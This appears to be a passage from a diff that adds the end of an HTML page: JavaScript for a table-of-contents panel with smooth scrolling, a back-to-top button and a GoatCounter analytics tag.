+      var a=document.createElement('a');
+      a.href='#'+id;
+      a.textContent=h.textContent;
+      a.addEventListener('click',function(e){
+        e.preventDefault();
+        document.getElementById(id).scrollIntoView({behavior:'smooth',block:'start'});
+        panel.classList.remove('open');
+      });
+      li.appendChild(a);
+      list.appendChild(li);
+    });
+  }
+  build();
+  new MutationObserver(build).observe(document.documentElement,{attributes:true,attributeFilter:['class']});
+})();
+</script>
+
+<button id="back-to-top" aria-label="Back to top">↑</button>
+<script>
+(function(){
+  var btn=document.getElementById('back-to-top');
+  window.addEventListener('scroll',function(){btn.classList.toggle('visible',window.scrollY>300);},{passive:true});
+  btn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+})();
+</script>
+<script data-goatcounter="https://sabastiaz.goatcounter.com/count" async src="//gc.zgo.at/count.js"></script>
+</body>
+</html>
